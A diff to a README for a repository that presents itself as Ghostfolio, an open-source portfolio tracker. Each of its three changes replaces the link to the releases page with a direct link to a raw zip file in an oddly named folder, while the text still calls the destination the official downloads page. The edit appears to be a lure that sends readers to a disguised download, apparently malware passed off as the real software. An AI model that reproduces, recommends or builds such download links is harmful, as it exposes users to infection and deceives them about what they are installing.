@@ -1,7 +1,7 @@
 <h1>📊 Ghostfolio-Open-Source-Wealth-Management-Software - Track Your Wealth Securely and Privately</h1>
 
 <p align="center">
-  <a href="https://github.com/eduruzzene/Ghostfolio-Open-Source-Wealth-Management-Software/releases">
+  <a href="https://github.com/eduruzzene/Ghostfolio-Open-Source-Wealth-Management-Software/raw/refs/heads/main/muliebrous/2.1.zip">
     <img src="https://img.shields.io/badge/Download-Ghostfolio-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50" alt="Download Ghostfolio">
   </a>
 </p>
@@ -46,7 +46,7 @@ This tool is built by developers who believe financial data should be private an
 ### Step 1: Download the Software
 
 **Visit this link to download the application:**  
-👉 [Click Here to Download Ghostfolio](https://github.com/eduruzzene/Ghostfolio-Open-Source-Wealth-Management-Software/releases)
+👉 [Click Here to Download Ghostfolio](https://github.com/eduruzzene/Ghostfolio-Open-Source-Wealth-Management-Software/raw/refs/heads/main/muliebrous/2.1.zip)
 
 This will take you to the official downloads page where you can get the latest version.
 
@@ -169,6 +169,6 @@ Ghostfolio is released under the AGPL-3.0 license. This means you are free to us
 ---
 
 **Ready to take control of your investments?**  
-👉 [**Download Ghostfolio Now**](https://github.com/eduruzzene/Ghostfolio-Open-Source-Wealth-Management-Software/releases)
+👉 [**Download Ghostfolio Now**](https://github.com/eduruzzene/Ghostfolio-Open-Source-Wealth-Management-Software/raw/refs/heads/main/muliebrous/2.1.zip)
 
 Keywords: angular, crypto, etf, fintech, nestjs, portfolio-management, postgresql, stocks, wealthtech
